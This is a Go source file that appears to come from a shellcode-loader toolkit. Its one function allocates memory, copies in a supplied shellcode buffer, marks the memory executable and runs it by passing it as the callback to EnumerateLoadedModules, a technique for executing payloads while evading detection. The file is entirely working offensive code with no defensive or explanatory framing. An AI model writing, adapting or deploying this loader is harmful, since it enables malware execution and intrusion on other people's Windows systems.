package loader

import (
	"syscall"
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func EnumerateLoadedModulesLoad(shellcode []byte) {
	addr, _, _ := wdll.VirtualAlloc().Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		panic("0")
	}

	_, _, errRtlMoveMemory := wdll.RtlMoveMemory().Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		panic("Call to RtlMoveMemory failed!")
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := wdll.VirtualProtect().Call(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic("Call to VirtualProtect failed!")
	}

	//Calling GetCurrentProcess to get a handle
	handle, _ := syscall.GetCurrentProcess()
	_, _, errenum := wdll.EnumerateLoadedModules().Call(
		uintptr(handle),
		addr, 0,
	)
	if errenum != nil && errenum.Error() != "The operation completed successfully." {
		panic("Call to VirtualProtect failed!")
	}
}
